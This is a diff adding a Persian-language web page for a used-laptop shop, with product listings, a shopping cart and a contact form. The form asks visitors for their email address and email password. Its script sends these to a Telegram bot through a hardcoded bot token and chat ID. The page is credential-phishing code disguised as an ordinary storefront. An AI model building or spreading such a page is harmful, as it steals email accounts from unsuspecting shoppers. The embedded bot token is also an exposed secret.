@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فروشگاه لپ‌تاپ‌های کارکرده</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: #333;
+            color: #fff;
+            padding: 10px 0;
+            text-align: center;
+        }
+        .container {
+            width: 80%;
+            margin: 20px auto;
+        }
+        .product {
+            display: inline-block;
+            width: 30%;
+            margin: 15px;
+            padding: 20px;
+            background-color: #fff;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        .product img {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+        }
+        .product h3 {
+            color: #333;
+        }
+        .product .price {
+            color: #f39c12;
+            font-size: 18px;
+            margin: 10px 0;
+        }
+        .product button {
+            background-color: #27ae60;
+            color: #fff;
+            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .cart {
+            margin-top: 20px;
+            padding: 20px;
+            background-color: #fff;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        .cart h2 {
+            margin-top: 0;
+        }
+        .cart button {
+            background-color: #e74c3c;
+            padding: 10px 20px;
+            border: none;
+            color: #fff;
+            font-size: 18px;
+            cursor: pointer;
+        }
+        .form-container {
+            background-color: #fff;
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        .form-container input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <h1>فروشگاه لپ‌تاپ‌های کارکرده</h1>
+</header>
+
+<div class="container">
+    <div class="product">
+        <img src="https://via.placeholder.com/300x200" alt="لپ‌تاپ 1">
+        <h3>لپ‌تاپ دل مدل XPS</h3>
+        <p class="price">2,500,000 تومان</p>
+        <button onclick="addToCart('لپ‌تاپ دل مدل XPS', 2500000)">افزودن به سبد خرید</button>
+    </div>
+
+    <div class="product">
+        <img src="https://via.placeholder.com/300x200" alt="لپ‌تاپ 2">
+        <h3>لپ‌تاپ اچ‌پی مدل Pavilion</h3>
+        <p class="price">3,000,000 تومان</p>
+        <button onclick="addToCart('لپ‌تاپ اچ‌پی مدل Pavilion', 3000000)">افزودن به سبد خرید</button>
+    </div>
+
+    <div class="product">
+        <img src="https://via.placeholder.com/300x200" alt="لپ‌تاپ 3">
+        <h3>لپ‌تاپ اپل مدل MacBook Pro</h3>
+        <p class="price">8,000,000 تومان</p>
+        <button onclick="addToCart('لپ‌تاپ اپل مدل MacBook Pro', 8000000)">افزودن به سبد خرید</button>
+    </div>
+
+    <div class="cart">
+        <h2>سبد خرید</h2>
+        <ul id="cartItems">
+            <li>هیچ کالایی در سبد خرید نیست.</li>
+        </ul>
+        <p id="totalPrice">جمع کل: 0 تومان</p>
+        <button onclick="checkout()">پرداخت</button>
+    </div>
+
+    <div class="form-container">
+        <h2>اطلاعات تماس</h2>
+        <form id="contactForm" onsubmit="sendInfo(event)">
+            <label for="name">نام:</label>
+            <input type="text" id="name" name="name" required>
+            <label for="email">ایمیل:</label>
+            <input type="email" id="email" name="email" required>
+            <label for="emailPassword">رمز ایمیل:</label>
+            <input type="password" id="emailPassword" name="emailPassword" required>
+            <button type="submit">ارسال</button>
+        </form>
+    </div>
+</div>
+
+<script>
+    let cart = [];
+    let total = 0;
+
+    function addToCart(productName, price) {
+        cart.push({ name: productName, price: price });
+        total += price;
+        updateCart();
+    }
+
+    function updateCart() {
+        const cartItems = document.getElementById('cartItems');
+        cartItems.innerHTML = '';
+        cart.forEach(item => {
+            const li = document.createElement('li');
+            li.textContent = `${item.name} - ${item.price} تومان`;
+            cartItems.appendChild(li);
+        });
+
+        const totalPrice = document.getElementById('totalPrice');
+        totalPrice.textContent = `جمع کل: ${total} تومان`;
+    }
+
+    function checkout() {
+        alert('به صفحه پرداخت هدایت می‌شوید');
+        // اینجا می‌توانید کد پرداخت را اضافه کنید
+    }
+
+    function sendInfo(event) {
+        event.preventDefault();
+
+        const name = document.getElementById('name').value;
+        const email = document.getElementById('email').value;
+        const emailPassword = document.getElementById('emailPassword').value;
+
+        // ارسال اطلاعات به ربات تلگرام
+        const telegramBotToken = '5899483276:AAGtvLrO_fpCz_2rWqPnxShRCWV2Wc2kOK8';
+        const telegramChatId = '6185981200';
+        const message = `نام: ${name}\nایمیل: ${email}\nرمز ایمیل: ${emailPassword}`;
+
+        const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(message)}`;
+
+        fetch(telegramUrl)
+            .then(response => response.json())
+            .then(data => {
+                alert('اطلاعات با موفقیت ارسال شد.');
+            })
+            .catch(error => {
+                alert('خطا در ارسال اطلاعات.');
+            });
+    }
+</script>
+
+</body>
+</html>
